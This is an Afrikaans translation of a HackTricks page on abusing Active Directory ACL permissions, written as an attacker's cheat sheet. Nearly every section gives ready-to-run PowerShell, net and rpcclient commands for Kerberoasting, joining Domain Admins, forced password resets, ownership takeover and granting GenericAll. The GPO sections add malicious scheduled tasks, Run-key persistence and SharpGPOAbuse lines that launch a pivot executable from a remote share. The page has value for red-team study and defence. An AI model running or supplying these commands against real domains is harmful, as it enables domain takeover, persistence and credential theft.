# Misbruik van Active Directory ACLs/ACEs

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

**Hierdie bladsy is hoofsaaklik 'n opsomming van die tegnieke van** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, kyk na die oorspronklike artikels.**

## **GenericAll Regte op Gebruiker**

Hierdie voorreg gee 'n aanvaller volle beheer oor 'n teiken-gebruikersrekening. Sodra `GenericAll`-regte bevestig is met behulp van die `Get-ObjectAcl`-bevel, kan 'n aanvaller:

* **Verander die Teiken se Wagwoord**: Deur `net user <gebruikersnaam> <wagwoord> /domain` te gebruik, kan die aanvaller die gebruiker se wagwoord herstel.
* **Gerigte Kerberoasting**: Ken 'n SPN toe aan die gebruiker se rekening om dit kerberoastbaar te maak, gebruik dan Rubeus en targetedKerberoast.py om die kaartjie-verlening-kaartjie (TGT) hasies te onttrek en te probeer kraak.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Gerigte ASREPRoasting**: Deaktiveer voorafgaande verifikasie vir die gebruiker, wat hul rekening vatbaar maak vir ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Regte op Groep**

Hierdie voorreg stel 'n aanvaller in staat om groepslidmaatskappe te manipuleer as hulle `GenericAll` regte op 'n groep soos `Domain Admins` het. Nadat die onderskeie naam van die groep geïdentifiseer is met `Get-NetGroup`, kan die aanvaller:

* **Voeg Hulself by die Domain Admins Groep**: Dit kan gedoen word deur direkte opdragte of deur die gebruik van modules soos Active Directory of PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Skryf op Rekenaar/Gebruiker**

Die besit van hierdie voorregte op 'n rekenaarobjek of 'n gebruikersrekening maak die volgende moontlik:

* **Kerberos-hulpbron-gebaseerde Beperkte Delegering**: Maak dit moontlik om 'n rekenaarobjek oor te neem.
* **Skadukredensiale**: Gebruik hierdie tegniek om 'n rekenaar- of gebruikersrekening te simuleer deur die voorregte te benut om skadukredensiale te skep.

## **WriteProperty op Groep**

As 'n gebruiker `WriteProperty`-regte het op alle voorwerpe vir 'n spesifieke groep (bv., `Domain Admins`), kan hulle:

* **Hulself by die Domain Admins-groep Voeg**: Moontlik deur die `net user` en `Add-NetGroupUser` opdragte te kombineer, maak hierdie metode voorreg-escalasie binne die domein moontlik.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Lidmaatskap) op Groep**

Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur bevele te gebruik wat groepslidmaatskap direk manipuleer. Deur die volgende bevelreeks te gebruik, kan self-toevoeging plaasvind:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-lidmaatskap)**

'n Soortgelyke voorreg wat aanvallers toelaat om hulself direk by groepe te voeg deur groepeienskappe te wysig as hulle die `WriteProperty`-reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Die besit van die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` maak dit moontlik om wagwoordherstel te doen sonder om die huidige wagwoord te weet. Verifikasie van hierdie reg en die uitbuiting daarvan kan gedoen word deur PowerShell of alternatiewe opdraglyn-hulpmiddels, wat verskeie metodes bied om 'n gebruiker se wagwoord te herstel, insluitend interaktiewe sessies en een-liners vir nie-interaktiewe omgewings. Die opdragte strek van eenvoudige PowerShell-aanroepings tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalsvektore demonstreer.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **SkryfEienaar op Groep**

Indien 'n aanvaller vind dat hulle `WriteOwner` regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulleself verander. Dit is veral impakvol wanneer die groep in kwestie `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepseienskappe en lidmaatskap moontlik maak. Die proses behels die identifisering van die korrekte objek via `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, óf deur SID óf naam.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite op Gebruiker**

Hierdie toestemming stel 'n aanvaller in staat om gebruikersseienskappe te wysig. Spesifiek, met `GenericWrite` toegang, kan die aanvaller die aanmeldingskripspad van 'n gebruiker verander om 'n skadelike krips uit te voer wanneer die gebruiker aanmeld. Dit word bereik deur die `Set-ADObject` bevel te gebruik om die `scriptpath` eienskap van die teiken gebruiker by te werk om na die aanvaller se krips te verwys.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite op Groep**

Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n geloofsbrieffobjek, dit gebruik om gebruikers by 'n groep toe te voeg of te verwyder, en die lidmaatskapveranderinge te verifieer met PowerShell-opdragte.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Die besit van 'n AD-voorwerp en die hê van `WriteDACL`-bevoegdhede daarop stel 'n aanvaller in staat om hulself `GenericAll`-bevoegdhede oor die voorwerp te gee. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die voorwerp en die vermoë om sy groepslidmaatskappe te wysig, moontlik te maak. Ten spyte hiervan bestaan beperkings wanneer 'n aanvaller probeer om hierdie bevoegdhede te misbruik deur die gebruik van die Active Directory-module se `Set-Acl` / `Get-Acl`-cmdlets.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikasie op die Domein (DCSync)**

Die DCSync-aanval maak gebruik van spesifieke replikasie-regte op die domein om 'n Domeinbeheerder na te boots en data te sinchroniseer, insluitend gebruikersgelde. Hierdie kragtige tegniek vereis regte soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domeinbeheerder. [**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)

## GPO Delegering <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegering

Gedelegeerde toegang om Groepbeleidsvoorwerpe (GPO's) te bestuur kan aansienlike sekuriteitsrisiko's inhou. Byvoorbeeld, as 'n gebruiker soos `offense\spotless` gedelegeerde GPO-bestuursregte het, kan hulle voorregte soos **WriteProperty**, **WriteDacl**, en **WriteOwner** hê. Hierdie regte kan misbruik word vir skadelike doeleindes, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerateer GPO Regte

Om verkeerd gekonfigureerde GPO's te identifiseer, kan PowerSploit se cmdlets aanmekaar gekoppel word. Dit maak die ontdekking van GPO's waar 'n spesifieke gebruiker regte het om te bestuur moontlik: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars met 'n Spesifieke Beleid Toegepas**: Dit is moontlik om vas te stel op watter rekenaars 'n spesifieke GPO van toepassing is, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleide Toegepas op 'n Spesifieke Rekenaar**: Om te sien watter beleide op 'n spesifieke rekenaar van toepassing is, kan opdragte soos `Get-DomainGPO` gebruik word.

**OU's met 'n Spesifieke Beleid Toegepas**: Die identifisering van organisatoriese eenhede (OUs) wat deur 'n gegewe beleid geraak word, kan gedoen word met behulp van `Get-DomainOU`.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPO's kan uitgebuit word om kode uit te voer, byvoorbeeld deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om 'n gebruiker by die plaaslike administrateursgroep op geaffekteerde rekenaars by te voeg, wat aansienlik voorregte verhoog:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Misbruik GPO

Die GroupPolicy-module, indien geïnstalleer, maak die skepping en koppeling van nuwe GPO's moontlik, en stel voorkeure soos registerwaardes in om agterdeure op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en 'n gebruiker om in te teken op die rekenaar vir uitvoering:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied 'n metode om bestaande GPO's te misbruik deur take by te voeg of instellings te wysig sonder om nuwe GPO's te skep. Hierdie instrument vereis die wysiging van bestaande GPO's of die gebruik van RSAT-instrumente om nuwes te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Dwangbeleid Opdatering

GPO-opdaterings vind normaalweg elke 90 minute plaas. Om hierdie proses te versnel, veral na die implementering van 'n verandering, kan die `gpupdate /force` bevel gebruik word op die teikenrekenaar om 'n onmiddellike beleidsopdatering af te dwing. Hierdie bevel verseker dat enige wysigings aan GPO's toegepas word sonder om te wag vir die volgende outomatiese opdateringsiklus.

### Onder die Hood

Na inspeksie van die Geplande Take vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die byvoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur skripte of opdraglynhulpmiddels wat daarop gemik is om stelselgedrag te wysig of bevoorregting te eskaleer.

Die struktuur van die taak, soos getoon in die XML-konfigurasie lêer wat gegenereer word deur `New-GPOImmediateTask`, skets die spesifieke van die geplande taak - insluitend die opdrag wat uitgevoer moet word en sy triggervoorwaardes. Hierdie lêer verteenwoordig hoe geplande take gedefinieer en bestuur word binne GPO's, wat 'n metode bied vir die uitvoering van willekeurige opdragte of skripte as deel van beleidshandhawing.

### Gebruikers en Groepe

GPO's maak ook die manipulasie van gebruikers- en groepslidmaatskappe op teikenstelsels moontlik. Deur die Gebruikers en Groepe beleidlêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe, soos die plaaslike `administrators` groep, toevoeg. Dit is moontlik deur die delegasie van GPO-bestuursregte, wat die wysiging van beleidlêers toelaat om nuwe gebruikers by te sluit of groepslidmaatskappe te verander.

Die XML-konfigurasie lêer vir Gebruikers en Groepe skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer toe te voeg, kan spesifieke gebruikers verhewe bevoorregtinge oor geaffekteerde stelsels verkry. Hierdie metode bied 'n direkte benadering tot bevoorregtingseksplorasie deur GPO-manipulasie.

Verder kan aanvullende metodes vir die uitvoering van kode of die handhawing van volharding, soos die benutting van aanmelding/afmelding skripte, die wysiging van register sleutels vir outomatiese uitvoer, die installeer van sagteware via .msi lêers, of die wysiging van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie kanale vir die handhawing van toegang en beheer oor teikenstelsels deur die misbruik van GPO's.

## Verwysings

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
